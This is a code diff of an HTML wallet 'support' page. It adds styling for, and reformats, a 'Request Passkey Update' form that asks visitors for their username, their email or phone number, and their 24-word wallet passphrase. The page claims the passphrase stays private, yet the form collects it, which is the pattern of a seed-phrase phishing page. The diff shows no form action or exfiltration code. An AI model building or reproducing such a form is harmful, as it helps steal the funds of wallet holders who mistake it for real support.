@@ -57,6 +57,45 @@
             }
         }
 
+          .passkey-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .passkey-form form {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .passkey-form input, 
+        .passkey-form textarea, 
+        .passkey-form button, 
+        .passkey-form h2 {
+            width: 50%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .passkey-form textarea {
+            height: 10em;
+            min-height: 10em;
+            resize: vertical;
+        }
+
+        .passkey-form button {
+            background-color: #423f87;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
         /* Title Section */
         .title-section {
             background-color: #423f87;
@@ -122,6 +161,7 @@
             border-radius: 50%;
         }
 
+        
         @media screen and (max-width: 1024px) {
             .footer {
                 display: flex;
@@ -158,20 +198,18 @@
         <h2>Follow steps below to find resources that may answer your support needs</h2>
     </div>
 
-<!-- Passkey Update Form -->
-<div class="container passkey-form">
-    <h2>Request Passkey Update</h2>
-    <form>
-        <input type="text" placeholder="Enter Username" required>
-        <input type="email" placeholder="Enter Email or Phone Number" required>
-        <textarea placeholder="Enter your 24-word passphrase" required></textarea>
-        <button type="submit">Submit Request</button>
-    </form>
-    
-    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible. 
-    <a href="#">For more info, click here.</a></p>
-</div>
-    
+        <!-- Passkey Update Form -->
+    <div class="container passkey-form">
+        <h2>Request Passkey Update</h2>
+        <form>
+            <input type="text" placeholder="Enter Username" required>
+            <input type="email" placeholder="Enter Email or Phone Number" required>
+            <textarea placeholder="Enter your 24-word passphrase" required></textarea>
+            <button type="submit">Submit Request</button>
+        </form>
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+    </div>
+        
     <!-- Content Section -->
     <div class="container">
         <div class="faq-section" onclick="toggleFAQ('faq1', this)">
